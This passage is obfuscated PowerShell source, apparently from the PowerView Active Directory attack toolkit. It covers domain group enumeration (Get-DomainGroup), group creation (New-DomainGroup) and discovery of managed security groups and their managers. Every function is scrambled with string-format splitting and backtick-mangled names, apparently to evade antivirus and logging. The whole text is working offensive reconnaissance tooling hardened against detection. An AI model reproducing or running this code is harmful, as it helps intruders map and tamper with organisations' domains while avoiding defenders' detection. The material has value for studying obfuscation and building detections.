        ${SEArcHEr`A`RG`Umen`TS} = @{}
        if (${PsBOU`N`Dp`Ar`Am`eTerS}[("{0}{1}"-f 'Doma','in')]) { ${sE`ARCher`AR`gUMEnts}[("{1}{0}" -f'ain','Dom')] = ${DOmA`IN} }
        if (${ps`B`OUn`Dp`ARAM`EtErS}[("{2}{1}{0}"-f'erties','p','Pro')]) { ${S`eAR`CHerA`RgUME`NTs}[("{3}{0}{1}{2}" -f 'roper','ti','es','P')] = ${P`Ro`pERTiEs} }
        if (${Psbo`Und`P`A`Ramet`ErS}[("{0}{1}{2}" -f 'SearchBa','s','e')]) { ${S`eaRchERAr`g`UM`Ents}[("{1}{0}{2}"-f 'Ba','Search','se')] = ${sE`ARC`h`BASE} }
        if (${PS`BoU`NdPaRam`etErS}[("{1}{0}" -f 'er','Serv')]) { ${SeaRcher`Ar`G`UM`EN`TS}[("{0}{1}" -f'Ser','ver')] = ${SER`VEr} }
        if (${P`SboUNDP`AR`A`metERS}[("{1}{2}{0}"-f'ope','Se','archSc')]) { ${se`Ar`CHerar`gUm`EnTs}[("{0}{3}{2}{1}" -f'S','e','p','earchSco')] = ${seaR`C`hScOpE} }
        if (${PSbOU`ND`P`A`RamETERs}[("{1}{2}{0}"-f 'eSize','ResultPa','g')]) { ${sEARCHE`R`ARg`Umen`TS}[("{0}{2}{1}"-f'Resul','ize','tPageS')] = ${R`eSuLtpA`GESI`ZE} }
        if (${P`S`Bo`Un`DpaRA`MeTerS}[("{2}{1}{3}{4}{0}"-f 'Limit','i','ServerT','m','e')]) { ${SeA`R`C`HeRArG`Um`enTs}[("{3}{4}{2}{1}{0}" -f'eLimit','m','i','Serve','rT')] = ${serVEr`TI`mELi`MiT} }
        if (${PsbouN`d`ParA`me`T`ers}[("{2}{1}{0}{3}"-f 'r','cu','Se','ityMasks')]) { ${SE`A`R`chE`R`ARguMeNTs}[("{0}{2}{3}{1}" -f 'Secu','Masks','r','ity')] = ${sE`cur`ITym`A`SKS} }
        if (${PsB`ouNdp`AR`AMetE`RS}[("{1}{0}{2}" -f'bs','Tom','tone')]) { ${SEar`C`He`RAR`guMenTS}[("{2}{0}{1}" -f'sto','ne','Tomb')] = ${TO`m`BS`TOne} }
        if (${PsB`oUND`PARAmET`ERs}[("{3}{2}{0}{1}" -f'entia','l','red','C')]) { ${sEArCHE`Ra`RG`UME`NtS}[("{0}{1}{2}" -f'Credent','ia','l')] = ${c`RE`DENTI`Al} }
        if (${PS`BouNd`paRAM`ETeRS}['SSL']) { ${Se`A`RcHErargU`mEnts}['SSL'] = ${S`sl} }
        if (${pSboUndp`ARa`M`etErs}[("{1}{2}{0}{3}" -f 'us','Ob','f','cate')]) {${seARChE`Rar`G`UMeNTs}[("{1}{0}{2}" -f'bfuscat','O','e')] = ${O`BFUSC`AtE} }
    }

    PROCESS {
        if (${psb`OUnD`paRa`mEt`Ers}[("{3}{2}{1}{4}{0}"-f'ity','ber','em','M','Ident')]) {

            if (${SeaRc`HERAR`g`UM`enTS}[("{0}{1}{2}{3}" -f 'Pro','p','erti','es')]) {
                ${oldpRo`pE`RtIES} = ${s`eArChE`R`ArgU`m`eNTs}[("{0}{1}{2}"-f'Pr','o','perties')]
            }

            ${SEaRCh`eRa`RgUMe`N`Ts}[("{0}{1}"-f'I','dentity')] = ${me`MbeRidEntI`Ty}
            ${SE`AR`C`HerA`Rgume`NTS}['Raw'] = ${TR`Ue}

            &("{3}{0}{4}{2}{1}{5}" -f'-','c','ainObje','Get','Dom','t') @SearcherArguments | &("{3}{0}{2}{1}"-f 'Each-Obj','ct','e','For') {
                
                ${Obje`CTD`ire`c`TOrYENT`RY} = ${_}.("{0}{3}{5}{2}{1}{4}"-f 'Ge','toryEn','ec','tD','try','ir').Invoke()

                
                ${OBJE`cTd`IREctOR`Y`ENT`RY}.("{1}{2}{0}" -f 'he','Refres','hCac').Invoke(("{0}{1}{2}"-f'token','Group','s'))

                ${O`BJ`e`ctdiR`ecTO`R`YENTRy}."T`oKE`NgROu`ps" | &("{3}{2}{0}{1}" -f 'Obj','ect','Each-','For') {
                    
                    ${GrO`Up`SiD} = (&("{2}{1}{0}"-f 'ct','e','New-Obj') ("{3}{1}{4}{10}{8}{9}{7}{5}{6}{2}{0}" -f 'er','em.','fi','Syst','Security.Pr','ec','urityIdenti','pal.S','c','i','in')(${_},0))."V`ALUE"

                    
                    if (${g`Ro`UpsId} -notmatch ("{1}{3}{2}{0}"-f '*','^S-','.','1-5-32-')) {
                        ${seAR`C`HE`RARGuMeNTS}[("{0}{1}" -f 'Id','entity')] = ${grO`UPs`Id}
                        ${S`ea`RCHerarguMeN`TS}['Raw'] = ${F`AL`Se}
                        if (${oLdP`Ro`peR`TiEs}) { ${sEaR`C`he`RARgUmE`NtS}[("{1}{2}{0}"-f 'es','P','roperti')] = ${O`ldPrope`RTieS} }
                        ${g`ROUp} = &("{0}{1}{3}{2}" -f 'G','et','ject','-DomainOb') @SearcherArguments
                        if (${gr`OUP}) {
                            ${G`Ro`UP}."Pso`BJE`ct"."TYPEn`A`meS".("{1}{0}"-f'ert','Ins').Invoke(0, ("{4}{2}{0}{1}{3}" -f'rVi','ew.G','e','roup','Pow'))
                            ${g`RoUP}
                        }
                    }
                }
            }
        }
        else {
            ${id`e`NTiT`YFi`lTer} = ''
            ${fI`Lt`ER} = ''
            ${ide`N`TitY} | &("{2}{1}{0}" -f 't','here-Objec','W') {${_}} | &("{0}{3}{1}{2}{4}" -f'For','-O','b','Each','ject') {
                ${ID`E`Nt`iTyInStA`NCE} = ${_}.("{0}{2}{1}" -f'Re','ce','pla').Invoke('(', '\28').("{0}{1}" -f'R','eplace').Invoke(')', '\29')
                if (${I`DENTityIN`st`Ance} -match ("{0}{1}" -f '^','S-1-')) {
                    ${IdeN`TIt`YFilTEr} += "(objectsid=$IdentityInstance)"
                }
                elseif (${iD`eNtit`Y`inStA`NcE} -match ("{1}{0}"-f 'CN=','^')) {
                    ${iDEnT`ITyf`iL`Ter} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${psB`OunDp`ARam`Et`ERs}[("{0}{2}{1}"-f'D','n','omai')]) -and (-not ${pSBOun`dp`ArAM`eT`eRS}[("{0}{1}{3}{2}"-f 'Se','ar','ase','chB')])) {
                        
                        
                        ${IdeNti`TYd`O`mA`In} = ${iD`ENT`itYIns`T`ANce}.("{0}{2}{1}" -f 'Su','ing','bStr').Invoke(${i`de`Nt`ItyIn`STanCe}.("{1}{0}" -f 'exOf','Ind').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{2}{3}{0}" -f'rbose','Wr','it','e-Ve') ('[Ge'+'t'+'-Do'+'mainGroup] '+'Ext'+'ra'+'cted '+'doma'+'in'+' '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        ${S`eaRC`heRA`R`guMents}[("{0}{1}" -f 'Doma','in')] = ${id`E`NTIT`YdOMaIN}
                        ${gROuPSEA`RC`H`er} = &("{2}{5}{1}{4}{0}{3}" -f 'a','S','Get-D','rcher','e','omain') @SearcherArguments
                        if (-not ${gR`o`UpsEA`R`CHER}) {
                            &("{1}{3}{0}{2}" -f 'r','Write-','ning','Wa') ('['+'Ge'+'t'+'-'+'DomainG'+'roup] '+'Un'+'able'+' '+'t'+'o '+'retri'+'eve'+' '+'do'+'main '+'se'+'ar'+'cher '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${iDE`NTItYIn`s`T`ANCE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${gU`I`DBYT`eSt`RiNG} = (([Guid]${Id`e`NtIt`YI`NsTAnCe}).("{1}{0}{2}{3}"-f 'r','ToByteAr','a','y').Invoke() | &("{0}{3}{1}{2}" -f 'Fo','Each-','Object','r') { '\' + ${_}.("{2}{0}{1}"-f 'oStr','ing','T').Invoke('X2') }) -join ''
                    ${ide`NtITYf`ilter} += "(objectguid=$GuidByteString)"
                }
                elseif (${I`d`ENTi`T`yinSTAnCe}.("{0}{1}"-f'Contain','s').Invoke('\')) {
                    ${cOn`VE`RteD`i`DEn`TItYi`NstanCE} = ${iD`eNTIty`InsT`Ance}.("{0}{1}{2}" -f'Re','pl','ace').Invoke('\28', '(').("{0}{1}"-f'Replac','e').Invoke('\29', ')') | &("{1}{0}{2}"-f'vert-','Con','ADName') -OutputType ("{3}{0}{2}{1}"-f 'n','al','ic','Cano')
                    if (${CoNVER`TeD`IdenTItyiNS`TA`NCe}) {
                        ${GroUp`doMA`In} = ${coNVERTEdID`entiTy`i`N`sTa`N`CE}.("{2}{1}{0}" -f 'ng','i','SubStr').Invoke(0, ${Co`N`VeRtEDID`entityI`N`StAn`CE}.("{1}{0}" -f'ndexOf','I').Invoke('/'))
                        ${gR`O`UpNaME} = ${iDenTI`TYIn`STa`N`cE}.("{0}{1}" -f 'S','plit').Invoke('\')[1]
                        ${id`En`TIT`YFIL`Ter} += "(samAccountName=$GroupName)"
                        ${sE`A`Rc`he`Ra`RgUMents}[("{0}{1}"-f 'Dom','ain')] = ${G`Ro`U`pDOmaIN}
                        &("{1}{3}{2}{4}{0}"-f'se','W','ite-','r','Verbo') ('[Ge'+'t-D'+'oma'+'inGroup]'+' '+'Extra'+'c'+'ted '+'do'+'ma'+'in '+"'$GroupDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${gro`UP`sEarchEr} = &("{1}{0}{2}{5}{4}{3}" -f'e','G','t-DomainS','er','arch','e') @SearcherArguments
                    }
                }
                else {
                    ${idE`Ntit`Y`FIL`TeR} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                }
            }

            if (${iDEN`T`iT`yFIL`Ter} -and (${IdE`Nt`ITYfilteR}.("{1}{0}"-f 'im','Tr').Invoke() -ne '') ) {
                ${fi`LtEr} += "(|$IdentityFilter)"
            }

            if (${PSbOu`ND`p`Ar`AmeTerS}[("{2}{1}{3}{0}"-f'unt','min','Ad','Co')]) {
                &("{3}{2}{0}{1}" -f'-Ver','bose','te','Wri') ("{6}{7}{1}{4}{3}{5}{2}{0}{8}" -f'Count','up] Searchin','in','for','g ',' adm','[Get-Domain','Gro','=1')
                ${Fi`L`TER} += (("{4}{2}{1}{3}{0}"-f'=1)','nc','mi','ount','(ad'))
            }
            if (${pS`B`o`Undp`AraME`TERS}[("{1}{0}{2}" -f'roupSco','G','pe')]) {
                ${Grou`pscOPE`V`A`LUE} = ${p`SBO`U`NdpARAMeTErS}[("{0}{2}{1}" -f 'GroupS','ope','c')]
                ${FI`LtEr} = Switch (${GroU`PScoP`EVA`LuE}) {
                    ("{1}{2}{0}"-f'l','DomainLoc','a')       { ("{4}{1}{7}{5}{2}{3}{9}{0}{8}{6}"-f'.1','gr','.','2.84','(','pe:1','3556.1.4.803:=4)','oupTy','1','0') }
                    ("{3}{1}{4}{0}{2}" -f'L','Do','ocal','Not','main')    { ((("{11}{5}{4}{1}{10}{9}{2}{6}{8}{7}{3}{0}" -f'4))','pT','113','3:=','rou','(g','556.','.80','1.4','1.2.840.','ype:','(!'))) }
                    ("{0}{1}{2}" -f 'G','lo','bal')            { ("{0}{7}{4}{9}{2}{1}{8}{3}{5}{6}"-f'(','.1135','40','.','e:1.2.','1.','4.803:=2)','groupTyp','56','8') }
                    ("{0}{2}{3}{1}"-f'Not','l','Glob','a')         { ((("{6}{3}{2}{4}{5}{1}{0}"-f '03:=2))','4.8','roupType:1.2','!(g','.840.113556','.1.','('))) }
                    ("{2}{1}{0}" -f'rsal','ive','Un')         { ("{1}{5}{0}{6}{2}{3}{4}" -f '840.113','(grou','.80','3',':=8)','pType:1.2.','556.1.4') }
                    ("{1}{2}{0}" -f 'iversal','N','otUn')      { ("{0}{1}{2}{3}{4}{5}{6}" -f '(','!(grou','pType:','1.2.','840.113556.1.4.','80','3:=8))') }
                }
                &("{3}{2}{1}{0}"-f'Verbose','-','e','Writ') ('[Get'+'-Dom'+'a'+'inG'+'roup] '+'Sea'+'rching'+' '+'f'+'or '+'grou'+'p '+'sco'+'p'+'e '+"'$GroupScopeValue'")
            }
            if (${PS`B`OUNdPA`RAMETERS}[("{3}{2}{0}{1}"-f 'rop','erty','upP','Gro')]) {
                ${g`Rou`P`p`ROPerTYvAlUe} = ${P`SBOuN`dparametE`Rs}[("{0}{1}{3}{2}{4}" -f 'Gr','oupP','p','ro','erty')]
                ${Fil`T`er} = Switch (${gr`ouP`P`R`oPE`RtY`VAlue}) {
                    ("{0}{2}{1}"-f'Se','rity','cu')              { ("{0}{1}{2}{4}{3}{7}{6}{5}" -f '(gro','upType:1.','2.840.113556','.4.803:=2','.1','483648)','7','14') }
                    ("{0}{1}{3}{2}" -f'Distr','i','n','butio')          { (("{8}{0}{3}{1}{2}{9}{4}{6}{5}{7}"-f '(groupTy','e:1','.2.84','p','11','.1.4.803:=2147483648)','3556',')','(!','0.')) }
                    ("{1}{0}{2}{3}"-f 'atedB','Cre','ySy','stem')       { ("{2}{3}{9}{6}{1}{0}{4}{8}{7}{5}" -f '840.113','2.','(g','r','556.1','3:=1)','upType:1.','4.80','.','o') }
                    ("{1}{0}{3}{2}{4}"-f'edB','NotCreat','Syste','y','m')    { ("{4}{2}{0}{1}{3}{6}{5}"-f'u','pType:1','gro','.2.840.1','(!(','=1))','13556.1.4.803:') }
                }
                &("{3}{2}{0}{1}{4}"-f '-V','erb','e','Writ','ose') ('[G'+'et-'+'DomainGroup'+'] '+'Sear'+'ching'+' '+'for'+' '+'g'+'r'+'oup '+'pro'+'pe'+'rty '+"'$GroupPropertyValue'")
            }
            if (${PS`BO`U`N`DPARaMEterS}[("{2}{0}{3}{1}"-f'i','r','LDAPF','lte')]) {
                &("{2}{3}{1}{0}" -f 'e','s','Wr','ite-Verbo') ('[Get-Doma'+'inGro'+'u'+'p]'+' '+'U'+'sing '+'a'+'ddit'+'ional '+'L'+'DAP '+'filt'+'er'+': '+"$LDAPFilter")
                ${fiL`T`eR} += "$LDAPFilter"
            }

            ${F`IlTEr} = "(&(objectCategory=group)$Filter)"
            &("{1}{0}{3}{2}"-f'e','Write-V','ose','rb') "[Get-DomainGroup] filter string: $($Filter) "
            ${resu`L`TS} = &("{0}{1}{2}{3}"-f'Invoke-LD','AP','Qu','ery') @SearcherArguments -LDAPFilter "$Filter"
            ${R`ESu`lTS} | &("{0}{1}{2}" -f 'Where-','Objec','t') {${_}} | &("{0}{2}{4}{3}{1}" -f 'ForE','-Object','a','h','c') {
                if (${PsbOU`NdparAme`T`ErS}['Raw']) {
                    
                    ${Gr`O`UP} = ${_}
                }
                else {
                    if (&("{2}{1}{0}" -f 'r','-Membe','Get') -inputobject ${_} -name ("{2}{1}{0}"-f's','ribute','Att') -Membertype ("{2}{0}{1}{3}" -f 'i','e','Propert','s')) {
                        ${p`ROp} = @{}
                        foreach (${a} in ${_}."AT`TRIbu`Tes"."kE`ys" | &("{1}{2}{0}"-f't-Object','So','r')) {
                            if ((${A} -eq ("{0}{1}{2}" -f 'ob','j','ectsid')) -or (${A} -eq ("{2}{1}{0}{3}" -f 'tor','s','sidhi','y')) -or (${a} -eq ("{2}{1}{0}"-f'uid','g','object')) -or (${a} -eq ("{1}{3}{2}{4}{0}" -f'icate','userce','i','rt','f'))) {
                                ${P`RoP}[${a}] = ${_}."aTtr`iBu`Tes"[${a}]
                            }
                            else {
                                ${Va`Lues} = @()
                                foreach (${V} in ${_}."at`TRI`ButES"[${A}]."g`ETvaLUES"([byte[]])) {
                                    ${v`AL`UEs} +=   (  Dir ("{2}{3}{0}{1}" -f'e',':m1LC','va','rIABl') )."va`lUE"::"uT`F8"."G`etSTRi`Ng"(${v})
                                }
                                ${P`ROp}[${a}] = ${V`AL`UeS}
                            }
                        }
                    }
                    else {
                        ${Pr`oP} = ${_}."ProPe`R`TI`Es"
                    }

                    ${g`R`Oup} = &("{3}{2}{1}{0}" -f 'ty','DAPProper','-L','Convert') -Properties ${p`ROP}
                }
                ${G`RO`Up}."psob`je`Ct"."T`YPEn`AmES".("{2}{1}{0}"-f 'ert','ns','I').Invoke(0, ("{1}{4}{0}{3}{2}" -f 'rVi','Pow','oup','ew.Gr','e'))
                ${g`ROUP}
            }
            if (${Re`S`UltS}) {
                try { ${Re`sUL`TS}.("{0}{2}{1}"-f 'd','pose','is').Invoke() }
                catch {
                    &("{0}{2}{1}" -f'Wr','se','ite-Verbo') ("{5}{1}{4}{9}{7}{2}{0}{3}{6}{8}" -f'the R','mai','g of ','esults ','nGroup] Erro','[Get-Do','obje','disposin','ct','r ')
                }
            }
        }
    }
}


function NeW-`do`mA`in`GROup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{2}{5}{8}{4}{6}{7}{1}" -f'PSUseShou','s','dProces','l','n','sForStateC','gFunct','ion','hangi'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}{3}"-f 'S','P','ShouldProces','s'}, '')]
    [OutputType({"{1}{8}{2}{6}{5}{7}{10}{4}{9}{3}{0}" -f'cipal','Dir','Accou','n','pP','t.G','ntManagemen','r','ectoryServices.','ri','ou'})]
    Param(
        [Parameter(mAndAToRy = ${tr`Ue})]
        [ValidateLength(0, 256)]
        [String]
        ${SaMacc`OuNTnA`Me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${nA`ME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${di`S`P`laYnaMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dEs`Cri`P`Tion},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOm`AIn},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`deNt`iAL} =  ${7`Tq02}::"EMP`Ty"
    )

    ${c`onTex`TArg`Um`EntS} = @{
        ("{1}{2}{0}" -f'y','Identi','t') = ${s`Amac`c`oU`NTNAme}
    }
    if (${p`SBo`U`NdP`ArAmeters}[("{1}{2}{0}" -f'ain','Do','m')]) { ${co`Nt`ExTaRG`UMEn`TS}[("{1}{0}" -f'ain','Dom')] = ${d`Om`AIN} }
    if (${P`s`BOun`dPAraMet`ERs}[("{1}{2}{0}" -f'ial','C','redent')]) { ${C`o`NTEx`TA`RguMENts}[("{2}{0}{1}"-f'i','al','Credent')] = ${C`RE`DEntial} }
    ${CO`N`TeXT} = &("{3}{2}{0}{1}{4}" -f 'ipalC','ont','inc','Get-Pr','ext') @ContextArguments

    if (${c`ONtEXT}) {
        ${GRo`UP} = &("{3}{0}{2}{1}"-f'-O','ct','bje','New') -TypeName ("{4}{6}{8}{1}{11}{0}{2}{13}{7}{5}{12}{3}{9}{15}{10}{14}"-f 'recto','D','ryServi','ment.Gro','Sy','cc','st','es.A','em.','up','rin','i','ountManage','c','cipal','P') -ArgumentList (${coNT`E`Xt}."CO`Nt`eXT")

        
        ${GRo`UP}."SAmAcc`oUN`TnA`me" = ${CO`N`TExt}."Ident`iTY"

        if (${PSBoun`d`pARA`MEt`ERs}[("{0}{1}" -f 'Na','me')]) {
            ${g`RO`UP}."NA`Me" = ${n`AmE}
        }
        else {
            ${gr`Oup}."N`AmE" = ${co`NT`ext}."Id`eNti`Ty"
        }
        if (${pS`BO`UNd`pa`RamE`TerS}[("{3}{1}{0}{2}"-f'm','splayNa','e','Di')]) {
            ${G`ROUp}."d`IS`PLA`ynaMe" = ${dI`sPl`AYna`ME}
        }
        else {
            ${g`Ro`Up}."dIS`p`lAYN`AME" = ${co`N`TEXT}."IdEN`Tity"
        }

        if (${PSbou`N`dp`AR`AmEteRS}[("{0}{2}{3}{1}" -f'Desc','tion','ri','p')]) {
            ${gRO`Up}."Des`cRiP`TIOn" = ${dE`SCri`P`TIOn}
        }

        &("{3}{2}{1}{0}" -f'e','s','te-Verbo','Wri') ('['+'New-Dom'+'ai'+'nGrou'+'p] '+'Attempti'+'n'+'g'+' '+'t'+'o '+'cre'+'a'+'te '+'gro'+'up '+"'$SamAccountName'")
        try {
            ${N`UlL} = ${grO`UP}.("{1}{0}"-f've','Sa').Invoke()
            &("{1}{2}{0}{3}"-f 'V','Writ','e-','erbose') ('[N'+'ew-Dom'+'ainGrou'+'p]'+' '+'Gro'+'up '+"'$SamAccountName' "+'s'+'ucce'+'ssfu'+'lly '+'creat'+'ed')
            ${g`Ro`Up}
        }
        catch {
            &("{2}{3}{1}{0}" -f'ng','rni','W','rite-Wa') ('[New-'+'D'+'omainGrou'+'p]'+' '+'Err'+'or '+'crea'+'ti'+'ng '+'gr'+'oup '+"'$SamAccountName' "+': '+"$_")
        }
    }
}


function Get-DOMa`I`NM`AnAGed`S`EcUrit`yGroUp {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{0}{1}" -f 'Should','Process','P','S'}, '')]
    [OutputType({"{7}{1}{3}{0}{4}{6}{5}{2}"-f 'age','er','yGroup','View.Man','dSecu','t','ri','Pow'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSition = 0, VALuEFROMpIPELIne = ${t`RuE}, vaLUEfROMPipELINEBYPrOpERtyNaMe = ${TR`Ue})]
        [Alias({"{1}{0}"-f'e','Nam'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OMAiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'A','DSPa','th'})]
        [String]
        ${s`e`AR`chBaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'Do','inController','ma'})]
        [String]
        ${S`erVEr},

        [ValidateSet({"{0}{1}"-f 'Ba','se'}, {"{0}{1}"-f 'One','Level'}, {"{0}{2}{1}"-f 'S','tree','ub'})]
        [String]
        ${seaR`cH`sCo`pE} = ("{1}{0}" -f'ree','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${RES`Ul`T`p`AGEsIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${serveR`Tim`e`Lim`It},

        [Switch]
        ${TOMB`st`onE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RedENT`Ial} =   ${7T`Q02}::"E`mPTY"
    )

    BEGIN {
        ${seaR`cHEr`ArG`UM`ENTs} = @{
            ("{0}{1}{2}" -f'LD','AP','Filter') = ((("{9}{14}{8}{2}{10}{12}{16}{15}{13}{0}{3}{5}{11}{4}{7}{1}{6}" -f '6',')',')','.1.4.',':=21474','80',')','83648','By=*','(&(m','(g','3','ro','Type:1.2.840.11355','anaged','p','u')))
            ("{2}{0}{1}"-f'i','es','Propert') = ("{2}{9}{3}{8}{4}{1}{11}{6}{10}{5}{7}{0}"-f'me','u','di','inguishedName,manag','dBy,samacco','tn','e,samac','a','e','st','coun','nttyp')
        }
        if (${psB`O`UNd`PArAMETERS}[("{2}{0}{1}"-f'arch','Base','Se')]) { ${SeArche`RArgU`Men`TS}[("{0}{1}{2}" -f 'SearchBa','s','e')] = ${SE`A`RcH`BASe} }
        if (${psBO`UndPA`RAme`Te`Rs}[("{0}{1}" -f 'Ser','ver')]) { ${SE`A`RchErarGum`EntS}[("{1}{0}" -f'erver','S')] = ${SeR`Ver} }
        if (${PSBO`U`Ndp`AraMeteRs}[("{0}{1}{2}" -f 'S','ear','chScope')]) { ${s`eARC`hERaRGu`mENTs}[("{3}{1}{0}{2}" -f 'arc','e','hScope','S')] = ${sEA`RC`HscoPe} }
        if (${pSboundPARaM`E`T`ERs}[("{2}{3}{0}{1}" -f 'ultPage','Size','R','es')]) { ${se`Ar`chEr`ARG`UmenTS}[("{0}{2}{1}"-f 'Resul','ageSize','tP')] = ${reSuLtpa`G`e`Si`zE} }
        if (${pS`BOUnDPAR`AM`EtE`Rs}[("{3}{2}{0}{1}"-f 'TimeL','imit','r','Serve')]) { ${SeARC`HERAR`GuME`NTS}[("{2}{1}{3}{0}"-f 'imeLimit','rver','Se','T')] = ${S`e`R`VERtI`MeLiMiT} }
        if (${pSbo`Undp`AR`AmeTErs}[("{0}{1}{2}"-f 'Sec','ur','ityMasks')]) { ${sEarCHEr`AR`guM`E`Nts}[("{0}{1}{2}"-f 'Secur','it','yMasks')] = ${seCu`R`ItYm`AS`ks} }
        if (${P`sBoUND`p`ArAMEterS}[("{1}{0}{2}"-f'mbston','To','e')]) { ${sE`ARCh`eRA`RGUmE`NTS}[("{2}{0}{1}" -f 'mbston','e','To')] = ${tO`MB`sTOne} }
        if (${psbOun`Dparam`Et`eRS}[("{1}{2}{0}"-f 'ntial','Cred','e')]) { ${sE`ArcHer`ArgU`meN`Ts}[("{1}{0}{2}" -f'd','Cre','ential')] = ${cred`EnT`ial} }
    }

    PROCESS {
        if (${P`sbo`Un`DParA`metE`Rs}[("{0}{2}{1}" -f'Dom','in','a')]) {
            ${sE`ArcHEraRg`U`ME`NTs}[("{2}{0}{1}" -f'm','ain','Do')] = ${d`omaiN}
            ${taRGe`Tdo`M`Ain} = ${dom`A`In}
        }
        else {
            ${taR`g`etD`o`main} = ${eN`V`:u`seRd`NSd`omaiN}
        }

        
        &("{1}{2}{0}{3}" -f'G','Get','-Domain','roup') @SearcherArguments | &("{2}{1}{0}{3}" -f 'je','-Ob','ForEach','ct') {
            ${seAr`CHEraR`GUME`NTS}[("{1}{2}{0}" -f 's','Prop','ertie')] = ("{7}{6}{4}{2}{11}{10}{8}{5}{9}{1}{0}{3}" -f 'ct','e','e,name,samaccoun','sid','nam','me,ob','guished','distin','na','j','type,samaccount','t')
            ${seArChe`RaR`gum`E`NTS}[("{0}{2}{1}"-f'Id','y','entit')] = ${_}."Ma`NAgE`DBY"
            ${n`ULl} = ${SeAR`cHeRarGUM`e`Nts}.("{0}{1}" -f'Remov','e').Invoke(("{0}{2}{1}"-f 'LD','r','APFilte'))

            
            
            ${gROuPm`A`Na`G`eR} = &("{3}{2}{1}{0}" -f't','bjec','nO','Get-Domai') @SearcherArguments
            
            ${m`ANA`gE`DG`RoUP} = &("{0}{3}{2}{1}" -f'New','ject','Ob','-') ("{1}{2}{0}"-f 'bject','P','SO')
            ${m`A`N`AGeDGRoup} | &("{1}{0}{2}"-f 'e','Add-Memb','r') ("{2}{0}{1}{3}" -f'te','proper','No','ty') ("{1}{2}{0}"-f 'e','G','roupNam') ${_}."Sa`m`ACCou`NtNa`me"
            ${mA`N`AgED`group} | &("{0}{1}{2}"-f 'Add','-Mem','ber') ("{2}{1}{0}"-f'ty','oper','Notepr') ("{0}{4}{3}{2}{1}"-f'G','dName','she','oupDistingui','r') ${_}."D`IStINg`U`iShEDName"
            ${Mana`ge`dgR`o`UP} | &("{1}{0}{2}" -f '-Mem','Add','ber') ("{0}{1}{2}" -f'No','t','eproperty') ("{0}{2}{1}" -f'M','Name','anager') ${GROUPMana`g`eR}."sa`mACCOU`N`T`NAme"
            ${m`AnaGedGrO`UP} | &("{3}{0}{2}{1}" -f'd','er','-Memb','Ad') ("{1}{0}{2}{3}"-f'ep','Not','rope','rty') ("{4}{5}{3}{0}{1}{6}{2}" -f 'ist','in','shedName','rD','Mana','ge','gui') ${Grou`pM`AnAgEr}."DiST`ING`UISh`E`DNaMe"

            
            if (${g`Ro`Up`M`Anager}."sAMaC`couN`TT`y`pE" -eq 0x10000000) {
                ${m`ANAG`eDGROUp} | &("{2}{1}{0}" -f 'd-Member','d','A') ("{0}{1}{2}"-f'Notep','r','operty') ("{2}{0}{1}"-f'anagerT','ype','M') ("{0}{1}"-f 'Gro','up')
            }
            elseif (${GRO`U`pManagEr}."sa`ma`CCoUN`T`TYPE" -eq 0x30000000) {
                ${MAn`Ag`eDGrOuP} | &("{1}{0}{3}{2}"-f'dd-','A','ember','M') ("{1}{0}{2}{3}" -f 'e','Not','pr','operty') ("{0}{2}{1}" -f 'Man','erType','ag') ("{1}{0}"-f 'ser','U')
            }

            ${Ac`L`ARGumEN`Ts} = @{
                ("{0}{1}"-f 'Ide','ntity') = ${_}."dI`stinGUIS`heDN`AME"
                ("{3}{0}{1}{2}" -f'gh','tsF','ilter','Ri') = ("{2}{3}{0}{1}"-f'M','embers','Wr','ite')
            }
            if (${PS`BouNDp`A`Ra`metE`RS}[("{0}{1}"-f 'Se','rver')]) { ${aclAR`gUMeN`TS}[("{1}{0}{2}"-f 'rv','Se','er')] = ${sEr`V`er} }
            if (${Psbo`UND`P`AR`AM`ETeRs}[("{1}{0}{2}"-f'cop','SearchS','e')]) { ${aclA`RG`U`meNTs}[("{2}{0}{1}" -f 'hSco','pe','Searc')] = ${SEAR`c`H`SCOpE} }
            if (${psb`O`UN`DPArAmETerS}[("{1}{2}{0}{3}"-f'i','R','esultPageS','ze')]) { ${AcL`Ar`GU`m`eNtS}[("{0}{3}{2}{1}"-f'R','geSize','sultPa','e')] = ${Re`sult`p`AgESIzE} }
            if (${PS`Bo`U`NdpArAmE`TERS}[("{2}{1}{0}" -f 'verTimeLimit','er','S')]) { ${A`CLa`R`GUmentS}[("{0}{3}{1}{2}"-f'S','eL','imit','erverTim')] = ${S`erve`RTi`me`L`iMit} }
            if (${p`SBoundP`ARa`MeTERS}[("{2}{1}{3}{0}" -f 'ne','m','To','bsto')]) { ${a`cLARG`U`MeNts}[("{0}{1}"-f 'Tombston','e')] = ${toMb`sT`O`Ne} }
            if (${Ps`BoUNdpAr`A`meteRS}[("{0}{1}{2}" -f 'Cr','e','dential')]) { ${aclarGu`M`eN`Ts}[("{3}{0}{1}{2}"-f 'd','e','ntial','Cre')] = ${cR`e`denT`IaL} }

            
            
            
            
            
            
            
            
            
            
            

            ${Ma`NaGE`DGROuP} | &("{0}{2}{1}" -f'Add-','er','Memb') ("{3}{1}{2}{0}" -f 'ty','e','proper','Not') ("{3}{0}{2}{1}" -f'C','rite','anW','Manager') ("{1}{0}" -f 'NOWN','UNK')

